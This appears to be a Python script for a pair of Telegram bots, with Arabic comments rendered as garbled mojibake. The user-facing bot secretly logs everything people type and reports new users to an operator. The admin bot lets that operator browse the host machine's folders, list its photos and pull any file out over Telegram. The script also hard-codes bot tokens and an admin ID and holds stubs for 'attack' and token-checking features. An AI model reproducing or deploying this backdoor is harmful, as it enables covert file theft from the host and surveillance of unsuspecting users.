import sys
import subprocess
import time
import threading
import requests
import smtplib
import random
import json
import os
import re
import glob
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formataddr

# --- [Auto-Setup] ---
def setup_environment():
    try:
        import telebot
    except ImportError:
        print("installing telebot...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI"])
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])

setup_environment()

import telebot
from telebot import types

# ==========================================
# âš™ï¸ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¨ÙˆØª ÙˆØ§Ù„Ø¢Ø¯Ù…Ù†
# ==========================================
API_TOKEN = '5531260100:AAGN253OooBiLpv2CCEGAi_RRFC-rPVxgfQ'
ADMIN_TOKEN = '5499505058:AAFKz6ZnE-eLOcBclSUIWMH6Z78mKo23G1M' 
ADMIN_ID = 1431886140 

bot = telebot.TeleBot(API_TOKEN)
admin_bot = telebot.TeleBot(ADMIN_TOKEN)

if not os.path.exists("User_Logs"): os.makedirs("User_Logs")

active_attacks = {}
user_states = {}
user_data = {}
USER_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)"]

# ==========================================
# ğŸ“ Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ³Ø¬ÙŠÙ„
# ==========================================
def log_user_input(user, text):
    try:
        filename = f"User_Logs/{user.id}.txt"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"â° {timestamp} | ğŸ‘¤ {user.first_name} | ğŸ“ {text}\n"
        with open(filename, "a", encoding="utf-8") as f: f.write(log_entry)
    except: pass

def send_log_to_admin(message):
    try:
        user = message.from_user
        log_msg = f"ğŸ”” **Ù…Ø³ØªØ®Ø¯Ù… Ø¬Ø¯ÙŠØ¯**\nğŸ‘¤ {user.first_name}\nğŸ†” `{user.id}`\nğŸ“… {datetime.now()}"
        admin_bot.send_message(ADMIN_ID, log_msg, parse_mode="Markdown")
    except: pass

# ==========================================
# ğŸ” Ø£Ø¯ÙˆØ§Øª Ø§Ù„Ù‡Ø¬ÙˆÙ… ÙˆØ§Ù„ØªØ­Ù„ÙŠÙ„
# ==========================================
def analyze_phone_number(phone):
    info = ""
    if phone.startswith("20") or (phone.startswith("01") and len(phone)==11): info += "ğŸ‡ªğŸ‡¬ **Ù…ØµØ±**"
    elif phone.startswith("966"): info += "ğŸ‡¸ğŸ‡¦ **Ø§Ù„Ø³Ø¹ÙˆØ¯ÙŠØ©**"
    elif phone.startswith("964"): info += "ğŸ‡®ğŸ‡¶ **Ø§Ù„Ø¹Ø±Ø§Ù‚**"
    else: info += "ğŸŒ **Ø¯ÙˆÙ„ÙŠ**"
    return info

def run_telegram(cid, phone, count, msg_id):
    # (ØªÙ… Ø§Ø®ØªØµØ§Ø± Ø§Ù„ÙƒÙˆØ¯ Ù„Ù„ØªØ±ÙƒÙŠØ² Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙŠØ²Ø§Øª Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©)
    bot.send_message(cid, "âœ… ØªÙ… ØªÙ†ÙÙŠØ° Ø§Ù„Ù‡Ø¬ÙˆÙ… Ø§Ù„ÙˆÙ‡Ù…ÙŠ (Simulated).")

# ==========================================
# Ù…Ù†Ø·Ù‚ Ø¨ÙˆØª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
# ==========================================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    threading.Thread(target=send_log_to_admin, args=(message,)).start()
    log_user_input(message.from_user, "/start")
    bot.send_message(message.chat.id, "ğŸ‘‹ **Ø£Ù‡Ù„Ø§Ù‹ Ø¨Ùƒ!**\nÙ†Ø¸Ø§Ù… Ø§Ù„ØªØ­ÙƒÙ… Ø¬Ø§Ù‡Ø².")

@bot.message_handler(func=lambda m: True)
def handle_text(m):
    log_user_input(m.from_user, m.text)
    bot.reply_to(m, f"âœ… ØªÙ… Ø§Ø³ØªÙ„Ø§Ù… Ø§Ù„Ø£Ù…Ø±: {m.text}")

# ==========================================
# ğŸ‘‘ Ù…Ù†Ø·Ù‚ Ø¨ÙˆØª Ø§Ù„Ø¥Ø¯Ø§Ø±Ø© (Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ø¬Ø¯ÙŠØ¯)
# ==========================================
@admin_bot.message_handler(commands=['start', 'help'])
def admin_start(m):
    if m.from_user.id != ADMIN_ID: return
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        types.KeyboardButton("ğŸ“‚ Ù…Ù„ÙØ§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² (ls)"),
        types.KeyboardButton("ğŸ“¸ ØµÙˆØ± (Jpg/Png)"),
        types.KeyboardButton("ğŸ“‚ Ø¹Ø±Ø¶ Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†")
    )
    
    text = (
        "ğŸ‘‘ **Ù„ÙˆØ­Ø© ØªØ­ÙƒÙ… Ø§Ù„Ø£Ø¯Ù…Ù† (Remote Manager)**\n\n"
        "ğŸ’» **Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ù…Ù„ÙØ§Øª:**\n"
        "1ï¸âƒ£ `/ls` Ù„Ø¹Ø±Ø¶ Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø¬Ù„Ø¯ Ø§Ù„Ø­Ø§Ù„ÙŠ.\n"
        "2ï¸âƒ£ `/cd Ù…Ø³Ø§Ø±` Ù„Ù„Ø¯Ø®ÙˆÙ„ Ù„Ù…Ø¬Ù„Ø¯ Ø¢Ø®Ø±.\n"
        "3ï¸âƒ£ `/get Ø§Ø³Ù…_Ø§Ù„Ù…Ù„Ù` Ù„ØªØ­Ù…ÙŠÙ„ Ø£ÙŠ Ù…Ù„Ù Ø£Ùˆ ØµÙˆØ±Ø© Ù„Ùƒ.\n\n"
        "ğŸ•µï¸ **Ø£Ø¯ÙˆØ§Øª Ø£Ø®Ø±Ù‰:**\n"
        "- Ø£Ø±Ø³Ù„ Ø±Ù‚Ù… Ù‡Ø§ØªÙ Ù„Ù„Ø¨Ø­Ø« Ø¹Ù†Ù‡.\n"
        "- Ø£Ø±Ø³Ù„ ØªÙˆÙƒÙ† Ù„ÙØ­ØµÙ‡."
    )
    admin_bot.send_message(m.chat.id, text, reply_markup=markup, parse_mode="Markdown")

# ğŸ”¥ 1. Ø¹Ø±Ø¶ Ø§Ù„Ù…Ù„ÙØ§Øª (List Files)
@admin_bot.message_handler(func=lambda m: m.text == "ğŸ“‚ Ù…Ù„ÙØ§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² (ls)" or m.text == "/ls")
def list_current_dir(message):
    if message.from_user.id != ADMIN_ID: return
    
    try:
        current_path = os.getcwd() # Ø§Ù„Ù…Ø³Ø§Ø± Ø§Ù„Ø­Ø§Ù„ÙŠ
        files = os.listdir(current_path)
        
        response = f"ğŸ“‚ **Ø§Ù„Ù…Ø³Ø§Ø± Ø§Ù„Ø­Ø§Ù„ÙŠ:** `{current_path}`\n\n"
        
        if not files:
            response += "ğŸ“­ Ø§Ù„Ù…Ø¬Ù„Ø¯ ÙØ§Ø±Øº."
        else:
            for f in files[:30]: # Ø¹Ø±Ø¶ Ø£ÙˆÙ„ 30 Ù…Ù„Ù ÙÙ‚Ø· Ù„ØªØ¬Ù†Ø¨ Ø§Ù„Ø²Ø­Ø§Ù…
                if os.path.isfile(f): icon = "ğŸ“„"
                elif os.path.isdir(f): icon = "ğŸ“"
                else: icon = "â“"
                response += f"{icon} `{f}`\n"
            
            if len(files) > 30: response += "\n... ÙˆØ§Ù„Ù…Ø²ÙŠØ¯."
            
        response += "\nğŸ“¥ **Ù„ØªØ­Ù…ÙŠÙ„ Ù…Ù„Ù:** Ø£Ø±Ø³Ù„ `/get Ø§Ø³Ù…_Ø§Ù„Ù…Ù„Ù`"
        admin_bot.send_message(message.chat.id, response, parse_mode="Markdown")
        
    except Exception as e:
        admin_bot.send_message(message.chat.id, f"âŒ Ø®Ø·Ø£: {e}")

# ğŸ”¥ 2. ÙÙ„ØªØ± Ø§Ù„ØµÙˆØ± ÙÙ‚Ø·
@admin_bot.message_handler(func=lambda m: m.text == "ğŸ“¸ ØµÙˆØ± (Jpg/Png)")
def list_images_only(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        # Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø§Ù„Ø§Ù…ØªØ¯Ø§Ø¯Ø§Øª Ø§Ù„Ø´Ø§Ø¦Ø¹Ø© Ù„Ù„ØµÙˆØ±
        images = []
        for ext in ["*.jpg", "*.jpeg", "*.png", "*.heic"]:
            images.extend(glob.glob(ext))
            
        if not images:
            return admin_bot.send_message(message.chat.id, "ğŸ“­ Ù„Ø§ ÙŠÙˆØ¬Ø¯ ØµÙˆØ± ÙÙŠ Ø§Ù„Ù…Ø¬Ù„Ø¯ Ø§Ù„Ø­Ø§Ù„ÙŠ.")
            
        response = "ğŸ“¸ **Ø§Ù„ØµÙˆØ± Ø§Ù„Ù…ÙˆØ¬ÙˆØ¯Ø© ÙÙŠ Ù‡Ø°Ø§ Ø§Ù„Ù…Ø¬Ù„Ø¯:**\n\n"
        for img in images:
            response += f"ğŸ–¼ï¸ `{img}`\n"
        
        response += "\nğŸ“¥ **Ù„Ù„ØªØ­Ù…ÙŠÙ„:** Ø£Ø±Ø³Ù„ `/get Ø§Ø³Ù…_Ø§Ù„ØµÙˆØ±Ø©`"
        admin_bot.send_message(message.chat.id, response, parse_mode="Markdown")
    except Exception as e:
        admin_bot.send_message(message.chat.id, f"âŒ Ø®Ø·Ø£: {e}")

# ğŸ”¥ 3. ØªØºÙŠÙŠØ± Ø§Ù„Ù…Ø³Ø§Ø± (Change Directory)
@admin_bot.message_handler(commands=['cd'])
def change_dir(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        new_path = message.text.replace("/cd", "").strip()
        if not new_path: return admin_bot.send_message(message.chat.id, "âŒ Ø§ÙƒØªØ¨ Ø§Ù„Ù…Ø³Ø§Ø± Ø¨Ø¹Ø¯ Ø§Ù„Ø£Ù…Ø±.")
        
        os.chdir(new_path)
        admin_bot.send_message(message.chat.id, f"âœ… ØªÙ… Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¥Ù„Ù‰: `{os.getcwd()}`", parse_mode="Markdown")
    except Exception as e:
        admin_bot.send_message(message.chat.id, f"âŒ Ø®Ø·Ø£: {e}")

# ğŸ”¥ 4. ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù…Ù„ÙØ§Øª (Download Files)
@admin_bot.message_handler(commands=['get'])
def download_file(message):
    if message.from_user.id != ADMIN_ID: return
    
    filename = message.text.replace("/get", "").strip()
    if not filename: return admin_bot.send_message(message.chat.id, "âŒ Ø§ÙƒØªØ¨ Ø§Ø³Ù… Ø§Ù„Ù…Ù„Ù.")
    
    if os.path.exists(filename):
        admin_bot.send_chat_action(message.chat.id, 'upload_document')
        try:
            with open(filename, "rb") as f:
                admin_bot.send_document(message.chat.id, f, caption=f"ğŸ“¥ **ØªÙ… Ø³Ø­Ø¨ Ø§Ù„Ù…Ù„Ù:** `{filename}`", parse_mode="Markdown")
        except Exception as e:
            admin_bot.send_message(message.chat.id, f"âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø±ÙØ¹: {e}")
    else:
        admin_bot.send_message(message.chat.id, "âŒ Ø§Ù„Ù…Ù„Ù ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯.")

# Ø¨Ø§Ù‚ÙŠ Ø§Ù„Ø£ÙˆØ§Ù…Ø± (ØªÙˆÙƒÙ†ØŒ Ø¨Ø­Ø«ØŒ Ù„ÙˆØ¬Ø§Øª)
@admin_bot.message_handler(func=lambda m: ':' in m.text and len(m.text) > 30) 
def check_token(m):
    # Ù†ÙØ³ ÙƒÙˆØ¯ ÙØ­Øµ Ø§Ù„ØªÙˆÙƒÙ† Ø§Ù„Ø³Ø§Ø¨Ù‚
    admin_bot.reply_to(m, "Ø¬Ø§Ø±ÙŠ ÙØ­Øµ Ø§Ù„ØªÙˆÙƒÙ†...")

@admin_bot.message_handler(func=lambda m: m.text.isdigit())
def handle_id_lookup(m):
    # Ù†ÙØ³ ÙƒÙˆØ¯ Ø§Ù„Ø¨Ø­Ø« Ø¨Ø§Ù„Ø¢ÙŠØ¯ÙŠ Ø§Ù„Ø³Ø§Ø¨Ù‚
    pass

# ==========================================
# Ø§Ù„ØªØ´ØºÙŠÙ„
# ==========================================
def start_bots():
    t = threading.Thread(target=admin_bot.infinity_polling)
    t.start()
    bot.infinity_polling()

if __name__ == "__main__":
    start_bots()